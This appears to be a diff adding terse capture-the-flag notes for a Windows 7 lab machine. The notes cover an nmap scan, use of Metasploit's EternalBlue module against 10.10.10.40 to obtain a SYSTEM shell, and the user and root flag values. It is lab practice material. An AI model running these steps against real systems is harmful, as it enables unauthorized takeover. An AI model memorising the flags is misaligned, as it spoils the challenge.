@@ -1,0 +1,14 @@
+nmap -sC -sV -oN nmap 10.10.10.40 -v -A
+
+searchsploit smb windows 7 -> eternalblue (name of the box)
+
+msf5 > use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.10.40
+
+-> shell on windows as authority\system
+
+user flag in C:\Users\haris\Desktop
+4c546aea7dbee75cbd71de245c8deea9
+
+root flag in C:\Users\Administrator\Desktop
+ff548eb71e920ff6c08843ce9df4e717
